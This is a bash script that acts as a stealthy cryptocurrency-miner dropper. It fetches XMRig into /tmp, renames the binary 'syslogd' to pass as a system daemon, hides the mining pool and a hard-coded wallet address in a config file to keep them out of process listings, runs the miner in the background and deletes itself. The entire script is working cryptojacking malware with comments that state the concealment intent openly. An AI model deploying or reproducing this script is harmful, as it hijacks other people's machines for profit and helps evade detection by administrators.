#!/bin/bash

if pgrep -x "syslogd" >/dev/null; then
  rm -f "$(realpath "$0")"
  exit 0
fi
# Go to /tmp
cd /tmp
rm -rf not.sh
# Download latest XMRig release
LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest \
  | grep browser_download_url \
  | grep "linux-static-x64" \
  | cut -d '"' -f 4)

wget -O xmrig.tar.gz "$LATEST_URL"
tar -xf xmrig.tar.gz
XMRIG_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -n 1)
cd "$XMRIG_DIR" || exit 1

# 1. Rename the binary to mask it in process lists
mv xmrig syslogd
chmod +x syslogd

# 2. Create a JSON config file to hide arguments
# This keeps your wallet and pool out of the 'ps' command line
cat <<EOF > config.json
{
    "autosave": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "fr-salvium.miningocean.org:8462",
            "user": "SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm",
            "pass": "Worker01",
            "keepalive": true,
            "tls": false
        }
    ],
    "donate-level": 1
}
EOF

echo "Starting miner as 'syslogd' using config.json..."

# 3. Start the miner using the config file
# In htop, this will only show as: ./syslogd --config=config.json
rm -f "$(realpath "$0")"
./syslogd --config=config.json >/tmp/syslogd.log 2>&1 &

echo "Process started. Details are hidden in the config file."
rm -f "$(realpath "$0")"
